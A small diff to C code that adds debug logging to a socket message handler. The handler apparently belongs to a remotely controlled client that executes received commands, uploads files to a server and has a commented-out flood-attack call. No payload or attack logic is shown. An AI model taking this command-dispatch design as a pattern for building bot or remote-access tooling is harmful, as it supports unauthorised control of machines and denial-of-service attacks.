@@ -131,6 +131,7 @@ void receive_and_process_message(int sockfd) {
 
     switch (cmd.order_type) {
         case COMMAND_:
+            output_log("Preparing for COMMAND_ parsing and execution\n", LOG_DEBUG, LOG_TO_CONSOLE);
             parse_and_execute_command(cmd, sockfd);
             break;
         case ASKLOGS_:
@@ -146,6 +147,7 @@ void receive_and_process_message(int sockfd) {
             //launch_flood(cmd, sockfd);
             break;
         case UPLOAD:
+            output_log("Preparing for UPLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
             upload_file_to_server(cmd.params[0], sockfd);
             break;
         case UNKNOWN:
